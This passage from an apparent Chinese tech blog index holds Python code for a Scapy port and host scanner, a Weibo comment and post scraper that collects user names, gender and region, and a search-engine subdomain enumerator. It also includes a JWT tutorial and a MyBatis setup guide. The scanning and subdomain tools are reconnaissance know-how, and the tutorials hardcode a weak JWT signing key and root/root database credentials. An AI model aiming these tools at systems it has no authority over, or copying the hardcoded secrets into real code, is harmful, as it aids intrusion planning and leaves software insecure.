if way == &#39;ping&#39;:                dst_ip = input(&#39;请输入你要查询的主机或者范围：&#39;)                alive_ip_list = ping(dst_ip)                preview(alive_ip_list)            elif way == &#39;arp&#39;:                dst_ip = input(&#39;请输入你要查询的主机或者范围：&#39;)                alive_ip_list = arp(dst_ip)                preview(alive_ip_list)        elif service == &#39;port&#39;:            way = input(&#39;请输入扫描方式（syn/windows/ack/fin/null/xmas）：&#39;)            if way == &#39;syn&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = syn_scan(dst_ip, 1, 1024)                preview(alive_port_list)            elif way == &#39;windows&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = windows_scan(dst_ip, 1, 1024)                preview(alive_port_list)            elif way == &#39;ack&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = ack_scan(dst_ip, 1, 1024)                preview(alive_port_list)            elif way == &#39;fin&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = fin_scan(dst_ip, 1, 1024)                preview(alive_port_list)            elif way == &#39;null&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = null_scan(dst_ip, 1, 1024)                preview(alive_port_list)            elif way == &#39;xmas&#39;:                dst_ip = input(&#39;请输入你要查询的主机：&#39;)                alive_port_list = xmas_scan(dst_ip, 1, 1024)                preview(alive_port_list)        else:            print(&#39;i am a teapot&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> ARP </tag>
            
            <tag> Nmap </tag>
            
            <tag> Scapy </tag>
            
            <tag> TCP </tag>
            
            <tag> ICMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微博爬虫实例</title>
      <link href="/posts/spider_weibo/"/>
      <url>/posts/spider_weibo/</url>
      
        <content type="html"><![CDATA[<p><em>你需要先了解…</em></p><p><em>关于此文章…</em></p><h1 id="一-帖子"><a href="#一-帖子" class="headerlink" title="一. 帖子"></a>一. 帖子</h1><p>懒得写，贴个源码。<br>爬不了的话，传入你的cookie</p><pre><code class="python">import requests  # 网络请求import random  # 与time控制网络请求频率import time  # 与random控制网络请求频率import json  # 响应的json数据分析from tqdm import tqdm  # 进度条# 由此函数完成 请求-响应解析 的过程# 接收评论json文件的url，解析json文件并返回评论信息字典（max，total_number,max_id，max_id_type，commentlist[]）def getCommentTnfo(commenturl):    # 请求评论json文件    # print(commenturl)    headers = &#123;        &quot;cookie&quot;: &quot;&quot;,        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 Edg/116.0.1938.76&#39;    &#125;    response = requests.get(commenturl, headers=headers)    # 解析json文件内容：max_id，max_id_type，commentlist[]    # max,total_number是第一次请求要获取的信息    dic = &#123;        &#39;max&#39;: 0,        &#39;total_number&#39;: 0,        &#39;max_id&#39;: 0,        &#39;max_id_type&#39;: 0,        &#39;comment_list&#39;: []    &#125;    comment_json = json.loads(response.text)    if (comment_json[&quot;ok&quot;] == 1):        data = comment_json[&quot;data&quot;]        dic[&quot;max&quot;] = data[&quot;max&quot;]        dic[&quot;total_number&quot;] = data[&quot;total_number&quot;]        dic[&quot;max_id&quot;] = data[&quot;max_id&quot;]        dic[&quot;max_id_type&quot;] = data[&quot;max_id_type&quot;]        list = data[&quot;data&quot;]        for li in list:            user = li[&quot;user&quot;]            name = user[&quot;screen_name&quot;]            gender = user[&quot;gender&quot;]            source = li[&quot;source&quot;]            text = li[&quot;text&quot;]            # print(name + &quot;(&quot; + gender + &quot;|&quot; + source + &quot;)&quot; + &quot;:&quot; + text)            dic[&quot;comment_list&quot;].append(name + &quot;(&quot; + gender + &quot;|&quot; + source + &quot;)&quot; + &quot;:&quot; + text)        return dic    # 如果不写else，那么python默认函数返回None    else:        return dic# 此函数调用getCommentList函数,输入不同的max_id# 输入文章url，返回评论信息def getcomments():    blog = input(&quot;请输入帖子的url:&quot;)    id = blog.split(&#39;/&#39;)[-1]    mid = blog.split(&#39;/&#39;)[-1]    max_id_type = 0    comment_list = []    print(&quot;正在分析中...&quot;)    comment_url = &quot;https://m.weibo.cn/comments/hotflow?id=&quot; + id + &quot;&amp;mid=&quot; + mid + &quot;&amp;max_id_type=&quot; + str(max_id_type)    dic = getCommentTnfo(comment_url)    # max，total_number第一次请求时赋值，分析有多少页和多少评论    max = dic[&quot;max&quot;]    total_number = dic[&quot;total_number&quot;]    max_id = dic[&quot;max_id&quot;]    max_id_type = dic[&quot;max_id_type&quot;]    comment_list = comment_list + dic[&quot;comment_list&quot;]    print(&quot;查询到&quot; + str(max) + &quot;页内容，共计&quot; + str(total_number) + &quot;条评论&quot;)    print(&quot;正在爬取中...&quot;)    for i in tqdm(range(max-1)):    # for i in range(max - 1):        time.sleep(random.uniform(1.0, 3.0))        comment_url = &quot;https://m.weibo.cn/comments/hotflow?id=&quot; + id + &quot;&amp;mid=&quot; + mid + &quot;&amp;max_id=&quot; + str(max_id) + &quot;&amp;max_id_type=&quot; + str(max_id_type)        if(dic[&quot;max_id&quot;]!=0):            dic = getCommentTnfo(comment_url)            max_id = dic[&quot;max_id&quot;]            max_id_type = dic[&quot;max_id_type&quot;]            comment_list = comment_list + dic[&quot;comment_list&quot;]    # 是否预览    preview = input(&quot;共&quot; + str(len(comment_list)) + &quot;条记录，预览（y/n）：&quot;)    if (preview == &quot;y&quot; or preview == &quot;Y&quot;):        for comment in comment_list:            print(comment)    # 是否保存    save = input(&quot;共&quot; + str(len(comment_list)) + &quot;条记录，保存（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        print(&quot;正在写入中...&quot;)        with open(&quot;comment.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            for comment in tqdm(comment_list):                f.writelines(comment + &quot;\n&quot;)if __name__ == &#39;__main__&#39;:    while (True):        print(&quot;-------微博评论爬虫-------&quot;)        print(&quot;             by liangyue&quot;)        getcomments()</code></pre><h1 id="二-评论"><a href="#二-评论" class="headerlink" title="二. 评论"></a>二. 评论</h1><pre><code class="python">import requests  # 网络请求import random  # 与time控制网络请求频率import time  # 与random控制网络请求频率import json  # 响应的json数据分析from tqdm import tqdm  # 进度条def analyse(blogurl):    # 请求&amp;响应    headers = &#123;        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 Edg/116.0.1938.76&#39;    &#125;    response = requests.get(blogurl, headers=headers)    # 响应解析    list_dic_blog = []    response_json = json.loads(response.text)    if (response_json[&quot;ok&quot;] == 1):        data = response_json[&quot;data&quot;]        cards = data[&quot;cards&quot;]        for card in cards:            dic_blog = &#123;                &quot;user_name&quot;: &quot;&quot;,                &quot;user_gender&quot;: &quot;&quot;,                &quot;user_region&quot;: &quot;&quot;,                &quot;blog_text&quot;: &quot;&quot;,                &quot;blog_url&quot;: &quot;&quot;            &#125;            if &quot;mblog&quot; in card:                myblog = card[&quot;mblog&quot;]                user = myblog[&quot;user&quot;]                dic_blog[&quot;user_name&quot;] = user[&quot;screen_name&quot;]                dic_blog[&quot;user_gender&quot;] = user[&quot;gender&quot;]                if (&quot;status_province&quot; in myblog):                    dic_blog[&quot;user_region&quot;] = myblog[&quot;status_province&quot;]                mid = myblog[&quot;mid&quot;]                dic_blog[&quot;blog_text&quot;] = myblog[&quot;text&quot;]                dic_blog[&quot;blog_url&quot;] = &quot;https://m.weibo.cn/detail/&quot; + mid                list_dic_blog.append(dic_blog)            if &quot;card_group&quot; in card:                card_grop = card[&quot;card_group&quot;]                if &quot;mblog&quot; in card_grop[0]:                    myblog = (card_grop[0])[&quot;mblog&quot;]                    user = myblog[&quot;user&quot;]                    dic_blog[&quot;user_name&quot;] = user[&quot;screen_name&quot;]                    dic_blog[&quot;user_gender&quot;] = user[&quot;gender&quot;]                    if (&quot;status_province&quot; in myblog):                        dic_blog[&quot;user_region&quot;] = myblog[&quot;status_province&quot;]                    mid = myblog[&quot;mid&quot;]                    dic_blog[&quot;blog_text&quot;] = myblog[&quot;text&quot;]                    dic_blog[&quot;blog_url&quot;] = &quot;https://m.weibo.cn/detail/&quot; + mid                list_dic_blog.append(dic_blog)        return list_dic_blog    else:        return list_dic_blogdef getblog():    keyword = input(&quot;请输入关键字：&quot;)    page = input(&quot;请输入爬取页码（1-100）：&quot;)    page = int(page)    if (page &lt; 1 or page &gt; 100):        exit(418)    print(&quot;正在爬取中...&quot;)    list_dic_blog = []    for i in tqdm(range(page)):        if (page == 0):            blogurl = &quot;https://m.weibo.cn/api/container/getIndex?containerid=100103type%3D1%26q%3D&quot; + keyword + &quot;&amp;page_type=searchall&quot;            list_dic_blog = list_dic_blog + analyse(blogurl)        else:            time.sleep(random.uniform(1, 2))            blogurl = &quot;https://m.weibo.cn/api/container/getIndex?containerid=100103type%3D1%26q%3D&quot; + keyword + &quot;&amp;page_type=searchall&quot; + &quot;&amp;page=&quot; + str(                i)            list_dic_blog = list_dic_blog + analyse(blogurl)    # 是否预览？    preview = input(&quot;共&quot; + str(len(list_dic_blog)) + &quot;条记录，你是否希望预览（y/n）：&quot;)    if (preview == &quot;y&quot; or preview == &quot;Y&quot;):        for dic_blog in list_dic_blog:            print(dic_blog)    # 是否保存？    save = input(&quot;共&quot; + str(len(list_dic_blog)) + &quot;条记录，保存到blog.txt（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        with open(&quot;blog.txt&quot;, &quot;w&quot;, encoding=&#39;Utf-8&#39;) as f:            for dic_blog in tqdm(list_dic_blog):                f.writelines(str(dic_blog) + &quot;\n&quot;)if __name__ == &#39;__main__&#39;:    print(&quot;-------微博帖子-------&quot;)    print(&quot;           By liangyue&quot;)    while(True):        getblog()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Web </tag>
            
            <tag> Requests </tag>
            
            <tag> 微博 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名爬虫</title>
      <link href="/posts/spider_subdomain/"/>
      <url>/posts/spider_subdomain/</url>
      
        <content type="html"><![CDATA[<h1 id="子域名爬虫"><a href="#子域名爬虫" class="headerlink" title="子域名爬虫"></a>子域名爬虫</h1><h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>百度子域名搜索语法：<code>domain:xxx.com</code></p><p>百度将子域名存在于 <em><strong>div</strong></em> 标签的 <em><strong>mu</strong></em> 属性中，你可以通过 <em><strong>class&#x3D;”result c-container xpath-log new-pmd”</strong></em> 找到这个 <em><strong>div</strong></em> 标签。</p><pre><code class="python"># 定义一个采用baidu搜索的方法def baidu_search():    print(&quot;Powered by baidu...&quot;)    domain = input(&quot;input the domain you want to query:&quot;)    page = int(input(&quot;The more page,the more subdomain(not sure):&quot;))    if page &lt; 1 or page &gt; 100:        exit(418)    headers = &#123;        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56&#39;,        # &#39;cookie&#39;: &#39;&#39;    &#125;    print(&quot;url requesting...&quot;)    resp_list = []    for i in tqdm(range(page)):        time.sleep(random.uniform(0.3, 2.0))        if i == 0:            url = &quot;https://www.baidu.com/s?wd=domain%3A&quot; + domain            resp = requests.get(url, headers=headers)            resp_list.append(resp)        else:            url = &quot;https://www.baidu.com/s?wd=domain%3A&quot; + domain + &quot;&amp;pn=&quot; + str(i*10)            resp = requests.get(url, headers=headers)            resp_list.append(resp)    print(&quot;response analying...&quot;)    time.sleep(1)    subdomain_list = []  # 定义一个空列表用于存储收集到的子域名    for resp in tqdm(resp_list):        # 锁定含有子域名的标签        # 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，        soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)        tag_div = soup.find_all(&quot;div&quot;, class_=&#39;result c-container xpath-log new-pmd&#39;)        for i in tag_div:            link = i.get(&#39;mu&#39;)  # 获取标签内mu属性值，即子域名            # urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置            subdomain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)            # 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中            if (subdomain in subdomain_list) | (domain not in subdomain):                pass            else:                subdomain_list.append(subdomain)    # preview？    print(str(len(subdomain_list))+&quot; records total&quot;)    preview = input(&quot;preview or not(y/n):&quot;)    if preview == &quot;y&quot; or preview == &quot;Y&quot;:        for subdomain in subdomain_list:            print(subdomain)    # isSave?    save = input(&quot;save or not(y/n):&quot;)    if save == &quot;y&quot; or save == &quot;Y&quot;:        print(&quot;file writing...&quot;)        with open(&#39;subdomain.txt&#39;, &#39;w&#39;) as f:            # for subdomain in subdomain_list:            for subdomain in tqdm(subdomain_list):                f.writelines(subdomain + &quot;\n&quot;)</code></pre><h2 id="必应"><a href="#必应" class="headerlink" title="必应"></a>必应</h2><p>必应子域名搜索语法：<code>domain：xxx.com</code></p><p>必应的子域名位于 <strong>h2</strong> 标签下的 <strong>a</strong> 标签的 <strong>href</strong> 属性，很多链接都会放在a标签的href属性中。</p><p>另外在 <em><strong>div</strong></em> 标签的 <em><strong>cite</strong></em> 标签也可以找到，通过属性 <em><strong>class&#x3D;”b_attribution”</strong></em> 可以找到这个 <em><strong>div</strong></em> 标签。</p><h1 id="定义一个采用bing搜索的方法"><a href="#定义一个采用bing搜索的方法" class="headerlink" title="定义一个采用bing搜索的方法"></a>定义一个采用bing搜索的方法</h1><pre><code class="python"># 定义一个采用bing搜索的方法def bing_search():    print(&quot;Powered by bing...&quot;)    domain = input(&quot;input the domain you want to query:&quot;)    page = int(input(&quot;The more page,the more subdomain(not sure):&quot;))    if page &lt; 1 or page &gt; 100:        exit(418)    headers = &#123;        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56&#39;,        # &#39;cookie&#39;:&#39;&#39;    &#125;    resp_list = []    print(&quot;requesting...&quot;)    for i in tqdm(range(0, page)):        time.sleep(random.uniform(0.3, 2.0))        if i == 0:            url = &quot;https://cn.bing.com/search?q=domain%3a&quot; + domain            resp = requests.get(url=url, headers=headers)            resp_list.append(resp)        else:            url = &quot;https://cn.bing.com/search?q=domain%3a&quot; + domain + &quot;first=&quot; + str(i*10)            resp = requests.get(url=url, headers=headers)            resp_list.append(resp)    subdomain_list = []    print(&quot;response analying...&quot;)    time.sleep(1)    for resp in tqdm(resp_list):        # 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，        soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)        # 锁定含有子域名的标签        tag_cite = soup.find_all(&quot;cite&quot;)        for i in tag_cite:            link = i.text            # urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置            subdomain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)            # 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中            if subdomain in subdomain_list:                pass            else:                subdomain_list.append(subdomain)    # preview？    print(str(len(subdomain_list))+&quot; records total&quot;)    preview = input(&quot;preview or not(y/n):&quot;)    if preview == &quot;y&quot; or preview == &quot;Y&quot;:        for subdomain in subdomain_list:            print(subdomain)    # save?    save = input(&quot;save or not(y/n):&quot;)    if save == &quot;y&quot; or save == &quot;Y&quot;:        print(&quot;file writing...&quot;)        with open(&#39;subdomain.txt&#39;, &#39;w&#39;) as f:            for subdomain in tqdm(subdomain_list):                f.writelines(subdomain + &quot;\n&quot;)</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><pre><code class="python">import timeimport randomimport requestsfrom bs4 import BeautifulSoupfrom urllib.parse import urlparsefrom tqdm import tqdm# 定义一个采用baidu搜索的方法def baidu_search():    print(&quot;Powered by baidu...&quot;)    domain = input(&quot;input the domain you want to query:&quot;)    page = int(input(&quot;The more page,the more subdomain(not sure):&quot;))    if page &lt; 1 or page &gt; 100:        exit(418)    headers = &#123;        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56&#39;,        # &#39;cookie&#39;: &#39;&#39;    &#125;    print(&quot;url requesting...&quot;)    resp_list = []    for i in tqdm(range(page)):        time.sleep(random.uniform(0.3, 2.0))        if i == 0:            url = &quot;https://www.baidu.com/s?wd=domain%3A&quot; + domain            resp = requests.get(url, headers=headers)            resp_list.append(resp)        else:            url = &quot;https://www.baidu.com/s?wd=domain%3A&quot; + domain + &quot;&amp;pn=&quot; + str(i*10)            resp = requests.get(url, headers=headers)            resp_list.append(resp)    print(&quot;response analying...&quot;)    time.sleep(1)    subdomain_list = []  # 定义一个空列表用于存储收集到的子域名    for resp in tqdm(resp_list):        # 锁定含有子域名的标签        # 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，        soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)        tag_div = soup.find_all(&quot;div&quot;, class_=&#39;result c-container xpath-log new-pmd&#39;)        for i in tag_div:            link = i.get(&#39;mu&#39;)  # 获取标签内mu属性值，即子域名            # urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置            subdomain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)            # 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中            if (subdomain in subdomain_list) | (domain not in subdomain):                pass            else:                subdomain_list.append(subdomain)    # preview？    print(str(len(subdomain_list))+&quot; records total&quot;)    preview = input(&quot;preview or not(y/n):&quot;)    if preview == &quot;y&quot; or preview == &quot;Y&quot;:        for subdomain in subdomain_list:            print(subdomain)    # isSave?    save = input(&quot;save or not(y/n):&quot;)    if save == &quot;y&quot; or save == &quot;Y&quot;:        print(&quot;file writing...&quot;)        with open(&#39;subdomain.txt&#39;, &#39;w&#39;) as f:            # for subdomain in subdomain_list:            for subdomain in tqdm(subdomain_list):                f.writelines(subdomain + &quot;\n&quot;)# 定义一个采用bing搜索的方法def bing_search():    print(&quot;Powered by bing...&quot;)    domain = input(&quot;input the domain you want to query:&quot;)    page = int(input(&quot;The more page,the more subdomain(not sure):&quot;))    if page &lt; 1 or page &gt; 100:        exit(418)    headers = &#123;        &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.56&#39;,        # &#39;cookie&#39;:&#39;&#39;    &#125;    resp_list = []    print(&quot;requesting...&quot;)    for i in tqdm(range(0, page)):        time.sleep(random.uniform(0.3, 2.0))        if i == 0:            url = &quot;https://cn.bing.com/search?q=domain%3a&quot; + domain            resp = requests.get(url=url, headers=headers)            resp_list.append(resp)        else:            url = &quot;https://cn.bing.com/search?q=domain%3a&quot; + domain + &quot;first=&quot; + str(i*10)            resp = requests.get(url=url, headers=headers)            resp_list.append(resp)    subdomain_list = []    print(&quot;response analying...&quot;)    time.sleep(1)    for resp in tqdm(resp_list):        # 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，        soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)        # 锁定含有子域名的标签        tag_cite = soup.find_all(&quot;cite&quot;)        for i in tag_cite:            link = i.text            # urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置            subdomain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)            # 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中            if subdomain in subdomain_list:                pass            else:                subdomain_list.append(subdomain)    # preview？    print(str(len(subdomain_list))+&quot; records total&quot;)    preview = input(&quot;preview or not(y/n):&quot;)    if preview == &quot;y&quot; or preview == &quot;Y&quot;:        for subdomain in subdomain_list:            print(subdomain)    # save?    save = input(&quot;save or not(y/n):&quot;)    if save == &quot;y&quot; or save == &quot;Y&quot;:        print(&quot;file writing...&quot;)        with open(&#39;subdomain.txt&#39;, &#39;w&#39;) as f:            for subdomain in tqdm(subdomain_list):                f.writelines(subdomain + &quot;\n&quot;)if __name__ == &#39;__main__&#39;:    print(&quot;Subdomain Getter...&quot;)    while True:        engine = input(&quot;select a engine(baidu/bing):&quot;)        if engine == &quot;baidu&quot;:            baidu_search()        elif engine == &quot;bing&quot;:            bing_search()        else:            exit(418)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子域名 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发（五）-JWT</title>
      <link href="/posts/web_jwt/"/>
      <url>/posts/web_jwt/</url>
      
        <content type="html"><![CDATA[<p><em>这篇文章将会向你介绍JWT的理论基础和程序实现</em></p><h1 id="一-JWT-理论"><a href="#一-JWT-理论" class="headerlink" title="一. JWT-理论"></a>一. JWT-理论</h1><h2 id="JWT基础"><a href="#JWT基础" class="headerlink" title="JWT基础"></a>JWT基础</h2><p><em>如果你没有任何基础，请耐心看完这一部分</em></p><p>想象一下你登录某个网站的场景。你从登录页面输入账号密码进入到该网站，同时该网站返回你的个人信息，包括你的昵称，头像，个性签名，显示到网页上。更重要的是，登录网站意味着你的身份得到服务器的验证，你获得了访问你的个人信息的权限。</p><p>服务器通过账号密码识别我们的身份吗？是，但不完全是。首先，你需要明白我们浏览器所依靠的http协议是无状态的。这就好像你和一个记忆力差劲的人交流，每一轮对话之后，他都会忘记你的名字。所以，你在每次和他说话之前，都需要重申你的身份。服务器就像这么一个人，尽管你对它说尽千言万语，而服务器只会在众多用户中迷失你的名字。</p><p>那么，这是否意味着我们必须在每一个请求之前都输入我们的账号密码来告知服务器我们的合法身份呢？答案是否定的，有更简单的解决方案。JWT（JSON WEB TOKEN）就是一种实现方式。</p><p>在输入账号密码之后，服务器会返回一个token给我们。以后在每次请求，我们带上token，服务器便会在用户中认出你。但是，如果你企图修改token，服务器能轻易检查出。这一部分是通过签名实现，当服务器用秘钥对token签名后，任何对token的更改都需要这个秘钥。</p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JWT由三个部分组成：header，payload，signature。header标识类型和签名算法。payload一般会存放标识你的一些信息账号id，用户名等。signnature是服务器的签名，防止你篡改上一部分的信息冒充他人。</p><h3 id="header："><a href="#header：" class="headerlink" title="header："></a>header：</h3><pre><code>&#123;    &#39;typ&#39;: &#39;JWT&#39;,    &#39;alg&#39;: &#39;HS256&#39;&#125;</code></pre><p><em>类型是JWT；签名算法是HS256</em></p><h3 id="一般header会进行base64编码："><a href="#一般header会进行base64编码：" class="headerlink" title="一般header会进行base64编码："></a>一般header会进行base64编码：</h3><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></pre><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre><code>&#123;    &quot;sub&quot;: &quot;1234567890&quot;,    &quot;name&quot;: &quot;John Doe&quot;,    &quot;admin&quot;: true&#125;</code></pre><p><em>iss: jwt签发者；sub: jwt所面向的用户；aud: 接收jwt的一方；exp: jwt的过期时间，这个过期时间必须要大于签发时间；nbf: 定义在什么时间之前，该jwt都是不可用的.；iat: jwt的签发时间；jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</em></p><h3 id="一般会对payload进行base64编码："><a href="#一般会对payload进行base64编码：" class="headerlink" title="一般会对payload进行base64编码："></a>一般会对payload进行base64编码：</h3><pre><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</code></pre><h2 id="signature："><a href="#signature：" class="headerlink" title="signature："></a>signature：</h2><p>signature对上面两部分的base64编码使用key进行签名</p><pre><code>HMACSHA256（base64(header) . base64(payload) , key）</code></pre><p>一般像这样：<br>      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</p><h2 id="JWT-1"><a href="#JWT-1" class="headerlink" title="JWT"></a>JWT</h2><p>将这三部分合并，中间用“.”分隔，得到一个完整的JWT</p><pre><code>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</code></pre><h1 id="二-JWT-实现"><a href="#二-JWT-实现" class="headerlink" title="二. JWT-实现"></a>二. JWT-实现</h1><h2 id="0-添加依赖"><a href="#0-添加依赖" class="headerlink" title="0. 添加依赖"></a>0. 添加依赖</h2><pre><code>    &lt;!--JWT--&gt;    &lt;dependency&gt;        &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;        &lt;artifactId&gt;jjwt&lt;/artifactId&gt;        &lt;version&gt;0.9.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h2 id="1-生成token"><a href="#1-生成token" class="headerlink" title="1. 生成token"></a>1. 生成token</h2><pre><code>//token有效时间private static long expire = 604800;//校验token有效性秘钥private static String key = &quot;aaaabbbbccccddddaaaabbbbccccdddd&quot;;//token生成public static String generateToken(String username)&#123;Date now = new Date();Date expiration = new Date(now.getTime()+1000*expire);return Jwts.builder()//          .setHeaderParams()            .setSubject(username)            .setIssuedAt(now)            .setExpiration(expiration)            .signWith(SignatureAlgorithm.HS512,key)            .compact();&#125;</code></pre><h2 id="2-token校验"><a href="#2-token校验" class="headerlink" title="2. token校验"></a>2. token校验</h2><pre><code>//token校验public static Claims getClaimsByToken(String token)&#123;    return Jwts.parser()            .setSigningKey(key)            .parseClaimsJws(token)            .getBody();&#125;</code></pre><h2 id="3-一个简单的例子"><a href="#3-一个简单的例子" class="headerlink" title="3. 一个简单的例子"></a>3. 一个简单的例子</h2><p>你可以将上面两个函数封装在JwtUtils的类中，在Controller中调用token相关的函数在网络请求中使用token。</p><pre><code>String token = generateToken(name);</code></pre><p>登录之后将token返回到客户端。</p><pre><code>getClaimsByToken(token).getSubject().equals(name)</code></pre><p>校验客户端的token后，允许其访问对应接口。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发（四）-MyBatis</title>
      <link href="/posts/web_mybatis/"/>
      <url>/posts/web_mybatis/</url>
      
        <content type="html"><![CDATA[<h1 id="一-MyBatis-理论"><a href="#一-MyBatis-理论" class="headerlink" title="一. MyBatis-理论"></a>一. MyBatis-理论</h1><p>这一部分我也不是很了解，简单的写点理解。</p><h2 id="1-MyBatis基础"><a href="#1-MyBatis基础" class="headerlink" title="1. MyBatis基础"></a>1. MyBatis基础</h2><p>MyBatis将数据库语句映射到java函数，将一个函数同SQL语句绑定后，当你调用这个函数，对应的SQL语句将会执行，并且返回参数到函数的返回值。</p><p>同时，MyBatis将数据库的表和java的对象做了很好的连接。在MyBatis的作用下，映射SQL查询语句的函数可以返回java对象。</p><h1 id="二-MyBatis实现"><a href="#二-MyBatis实现" class="headerlink" title="二. MyBatis实现"></a>二. MyBatis实现</h1><h2 id="1-依赖和配置"><a href="#1-依赖和配置" class="headerlink" title="1. 依赖和配置"></a>1. 依赖和配置</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>你可以直接使用MyBatis-plus版本，它支持MyBatis</p><pre><code>    &lt;!--mybatis-plus--&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.baomidou&lt;/groupId&gt;        &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;        &lt;version&gt;3.4.2&lt;/version&gt;    &lt;/dependency&gt;    &lt;!--Mysql jdbc驱动--&gt;    &lt;dependency&gt;        &lt;groupId&gt;mysql&lt;/groupId&gt;        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;        &lt;version&gt;5.1.47&lt;/version&gt;    &lt;/dependency&gt;    &lt;!--druid 连接池--&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;        &lt;artifactId&gt;druid&lt;/artifactId&gt;        &lt;version&gt;1.1.20&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code>spring.datasource.type=com.alibaba.druid.pool.DruidDataSourcespring.datasource.driver-class-name=com.mysql.jdbc.Driverspring.datasource.url=jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=UTCspring.datasource.username=rootspring.datasource.password=root</code></pre><h2 id="2-新建实体类"><a href="#2-新建实体类" class="headerlink" title="2. 